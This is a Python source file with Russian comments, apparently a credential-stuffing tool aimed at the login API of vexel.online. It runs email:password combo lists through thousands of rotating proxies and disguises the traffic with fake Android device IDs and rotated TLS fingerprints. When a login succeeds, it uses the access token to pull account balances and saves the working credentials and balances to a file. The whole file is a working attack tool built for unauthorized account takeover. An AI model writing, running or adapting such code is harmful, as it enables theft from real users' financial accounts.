def get_history_path(base_file_path):
    return f".vexel_history_{os.path.basename(base_file_path)}.txt"

def load_history(history_path):
    if os.path.exists(history_path):
        with open(history_path, 'r', encoding='utf-8') as f:
            return set(line.strip() for line in f)
    return set()

def add_to_history(history_path, account_line):
    with save_lock:
        with open(history_path, 'a', encoding='utf-8') as f:
            f.write(account_line + "\n")

# --- КЛАСС ЧЕКЕРА ---

class VexelChecker:
    def __init__(self, email, password, p_threads, history_path, full_line):
        self.email = email
        self.password = password
        self.p_threads = p_threads
        self.history_path = history_path
        self.full_line = full_line
        self.found = False
        self.lock = threading.Lock()
        self.bad_confirmations = 0
        
        # --- ГЕНЕРАЦИЯ УНИКАЛЬНОЙ ПЕРСОНЫ ---
        acc_seed = int(hashlib.md5(self.email.lower().encode()).hexdigest(), 16)
        r_gen = random.Random(acc_seed)
        
        self.device_model = r_gen.choice(ANDROID_MODELS)
        self.ua = f"okhttp/{r_gen.choice(OKHTTP_VERSIONS)}"
        self.device_id = str(uuid.uuid5(uuid.NAMESPACE_DNS, self.email.lower()))
        # Выбор TLS-отпечатка привязан к аккаунту
        self.tls_profile = r_gen.choice(TLS_PROFILES)

    def check_proxy(self, proxy_str):
        if self.found or not pause_event.is_set() or global_stop: return
        if proxy_str in banned_proxies:
            ts, b_type = banned_proxies[proxy_str]
            limit = BAN_COOLDOWN if b_type == '403' else TIMEOUT_COOLDOWN
            if time.time() - ts < limit: return

        try:
            # Используем ротируемый TLS-отпечаток
            session = requests.Session(impersonate=self.tls_profile)
            session.proxies = {"http": proxy_str, "https": proxy_str}
            
            headers = {
                "Host": "vexel.online",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": self.ua,
                "X-Device-Id": self.device_id,
                "x-device-platform": "Android",
                "X-Device-Model": self.device_model,
                "Content-Type": "application/json; charset=utf-8"
            }
            
            payload = {"email": self.email, "password": self.password, "lang": "ru"}
            resp = session.post("https://vexel.online/api/v2/auth/newlogin", 
                                data=json.dumps(payload, separators=(',', ':')), 
                                headers=headers, timeout=12)
            
            if resp.status_code == 200:
                if '"access_token":"' in resp.text:
                    with self.lock:
                        if self.found: return
                        self.found = True
                    token = resp.json()['data']['access_token']
                    headers["Authorization"] = f"Bearer {token}"
                    acc_res = session.post("https://vexel.online/api/v2/accounts", 
                                           data=json.dumps({"operation": "accountGetList"}, separators=(',', ':')), 
                                           headers=headers, timeout=10)
                    balances = " | ".join(re.findall(r'"name"(.*?),"overdraft"', acc_res.text)).replace('":"', ':').replace('"', '').strip(': ')
                    log(f"[GOOD] {self.email}:{self.password} | {balances}", Color.GREEN)
                    with save_lock:
                        with open("success.txt", "a", encoding="utf-8") as f: f.write(f"{self.email}:{self.password} | {balances}\n")
                    add_to_history(self.history_path, self.full_line)
                    with stats_lock: stats['good'] += 1; stats['fail_streak'] = 0 

                elif '"status":0' in resp.text:
                    data = resp.json()
                    err_code = data.get('error', {}).get('code')
                    if err_code in [401, 424]:
                        with self.lock:
                            if err_code == 401:
                                self.bad_confirmations += 1
                                if self.bad_confirmations < BAD_CONFIRMATIONS_NEEDED: return
                            if self.found: return
                            self.found = True
                        if err_code == 424:
                            log(f"[BANNED] {self.email}:{self.password}", Color.MAGENTA)
                            with save_lock:
                                with open("banned.txt", "a", encoding="utf-8") as f: f.write(f"{self.email}:{self.password}\n")
                        else:
                            log(f"[BAD] {self.email}:{self.password}", Color.RED)
                            with save_lock:
                                with open("bad.txt", "a", encoding="utf-8") as f: f.write(f"{self.email}:{self.password}\n")
                        add_to_history(self.history_path, self.full_line)
                        with stats_lock: 
                            if err_code == 424: stats['banned'] += 1
                            else: stats['bad'] += 1
                            stats['fail_streak'] = 0
            elif resp.status_code == 403:
                banned_proxies[proxy_str] = (time.time(), '403')
        except: 
            banned_proxies[proxy_str] = (time.time(), 'timeout')

    def run(self):
        global global_stop
        if global_stop: return
        pause_event.wait() 
        with proxy_lock:
            current_proxies = random.sample(all_proxies, min(len(all_proxies), 1000))
        with ThreadPoolExecutor(max_workers=self.p_threads) as executor:
            for p in current_proxies:
                if self.found or global_stop: break
                executor.submit(self.check_proxy, p)
                time.sleep(random.uniform(*STAGGER_RANGE))
        if not self.found and not global_stop:
            with stats_lock:
                stats['fail_streak'] += 1
                current_streak = stats['fail_streak']
            log(f"[FAIL {current_streak}/10] {self.email}", Color.YELLOW)
            with save_lock:
                with open("failed_to_check.txt", "a", encoding="utf-8") as f: f.write(f"{self.email}:{self.password}\n")
            add_to_history(self.history_path, self.full_line)
            if current_streak >= 10:
                if stats['paused_once']:
                    log("\n" + "!"*60, Color.RED)
                    log("ОСТАНОВКА: Повторная серия из 10 FAIL после паузы.", Color.RED)
                    global_stop = True
                else:
                    stats['paused_once'] = True
                    self.trigger_auto_pause()
        time.sleep(random.uniform(*POST_CHECK_RANGE))
        with stats_lock: stats['left'] -= 1

    def trigger_auto_pause(self):
        if not pause_event.is_set(): return
        pause_event.clear()
        def countdown():
            for i in range(2400, 0, -1):
                if global_stop: break
                mins, secs = divmod(i, 60)
                sys.stdout.write(f"\r{Color.YELLOW}[!!!] ПАУЗА (10 FAIL). Ждем обновления IP: {mins:02d}:{secs:02d} {Color.RESET}")
                sys.stdout.flush()
                time.sleep(1)
            with stats_lock: stats['fail_streak'] = 0
            pause_event.set()
            if not global_stop: log("\n[>>>] Работа возобновлена!", Color.CYAN)
        threading.Thread(target=countdown, daemon=True).start()

def main():
    global all_proxies, global_stop
    os.system('cls' if os.name == 'nt' else 'clear')
    log("=== VEXEL MOBILE TURBO (TLS ROTATION + 500 DEVICES) ===", Color.CYAN)
    path = input("\nПеретяните файл с аккаунтами: ").strip().replace('"', '').replace("'", "")
    if not os.path.exists(path): return
    history_file = get_history_path(path)
    history_data = load_history(history_file)
    with open(path, "r", encoding="utf-8") as f:
        all_accounts = [l.strip() for l in f if ":" in l]
    if history_data:
        log(f"\n[!] Найдена история: {len(history_data)} аккаунтов.", Color.YELLOW)
        if input("Продолжить (y/n)? ").lower() == 'y':
            all_accounts = [acc for acc in all_accounts if acc not in history_data]
        else:
            if os.path.exists(history_file): os.remove(history_file)
    if not all_accounts: return
    threading.Thread(target=proxy_refresher, daemon=True).start()
    while not all_proxies: time.sleep(1)
    try:
        max_accs = int(input("Параллельных аккаунтов (30): "))
        threads_per_acc = int(input("Прокси на 1 аккаунт (50): "))
    except: max_accs, threads_per_acc = 30, 50
    stats['left'] = len(all_accounts)
    with ThreadPoolExecutor(max_workers=max_accs) as acc_executor:
        for acc_line in all_accounts:
            if global_stop: break
            u, p = acc_line.split(":", 1)
            acc_executor.submit(VexelChecker(u, p, threads_per_acc, history_file, acc_line).run)
    while not global_stop and stats['left'] > 0: time.sleep(1)
    log("\n--- РАБОТА ЗАВЕРШЕНА ---", Color.CYAN)
    input("Нажмите Enter для выхода...")

if __name__ == "__main__":
    main()
